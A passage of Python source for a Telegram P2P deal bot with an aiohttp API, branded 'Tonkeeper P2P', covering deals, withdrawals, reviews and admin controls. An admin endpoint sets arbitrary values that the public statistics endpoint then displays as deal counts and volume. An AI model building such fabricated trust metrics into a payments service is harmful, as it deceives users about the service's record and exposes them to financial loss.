                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        add_log("api_create_deal", {"deal_id": deal_id, "user_id": user_id, "amount": amount})
        return web.json_response({'success': True, 'deal_id': deal_id, 'link': link}, headers=headers)
    
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        bal = get_balance(user_id)
        curr_key = currency.lower()
        if bal.get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": str(user_id),
            "currency": currency,
            "amount": bal[curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        add_log("api_withdraw", {"user_id": user_id, "amount": bal[curr_key], "currency": currency})
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        if not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        if len(user_deals) < 1:
            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers=headers)
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        add_log("api_add_review", {"user_id": user_id, "rating": rating})
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    elif endpoint == '/api/delete_review':
        review_id = data.get('review_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if review_id in reviews:
            del reviews[review_id]
            save_json(FILES["reviews"], reviews)
            return web.json_response({'success': True}, headers=headers)
        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
    
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True}, headers=headers)
    
    elif endpoint == '/api/check_verification':
        return web.json_response({'success': True, 'verified': is_verified(user_id)}, headers=headers)
    
    elif endpoint == '/api/check_deals':
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        return web.json_response({'success': True, 'hasDeals': len(user_deals) >= 1}, headers=headers)
    
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        pending = [r for r in withdraw_requests.values() if r.get('status') == 'pending']
        return web.json_response({'success': True, 'requests': pending}, headers=headers)
    
    elif endpoint == '/api/confirm_withdraw':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        bal = get_balance(req['user_id'])
        curr_key = req['currency'].lower()
        if bal.get(curr_key, 0) >= req['amount']:
            bal[curr_key] -= req['amount']
            save_json(FILES["balance"], balance)
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)
        add_log("api_confirm_withdraw", {"request_id": request_id})
        return web.json_response({'success': True}, headers=headers)
    
    elif endpoint == '/api/reject_withdraw':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        withdraw_requests[request_id]['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)
        return web.json_response({'success': True}, headers=headers)
    
    elif endpoint == '/api/add_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        add_balance(target_user_id, currency, float(amount))
        add_log("api_add_balance", {"admin": user_id, "target": target_user_id, "amount": amount})
        return web.json_response({'success': True}, headers=headers)
    
    elif endpoint == '/api/manage_admin':
        target_user_id = data.get('target_user_id')
        action = data.get('action')
        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Master admin only'}, headers=headers)
        if action == 'add':
            admins[str(target_user_id)] = True
        elif action == 'remove':
            if str(target_user_id) in admins:
                del admins[str(target_user_id)]
        else:
            return web.json_response({'success': False, 'error': 'Invalid action'}, headers=headers)
        save_json(FILES["admins"], admins)
        return web.json_response({'success': True}, headers=headers)
    
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        deals_list = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            deals_list.append(d_copy)
        return web.json_response({'success': True, 'deals': deals_list}, headers=headers)
    
    elif endpoint == '/api/stats':
        stats_data = get_stats()
        return web.json_response({
            'success': True,
            'deals_today': stats_data.get('deals_today', 0),
            'users': stats_data.get('users', 0),
            'reviews': stats_data.get('reviews', len(reviews)),
            'volume': stats_data.get('volume', 0)
        }, headers=headers)
    
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        key = data.get('key')
        value = data.get('value')
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
        stats[key] = value
        save_json(FILES["stats"], stats)
        add_log("admin_set_stats", {"key": key, "value": value})
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 14. ЗАПУСК ВЕБ-СЕРВЕРА
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

# ============================================================
# 15. ЗАПУСК
# ============================================================
async def main():
    print("=" * 50)
    print("🔥 Tonkeeper P2P Бот + API")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print(f"📊 Отзывов: {len(reviews)}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
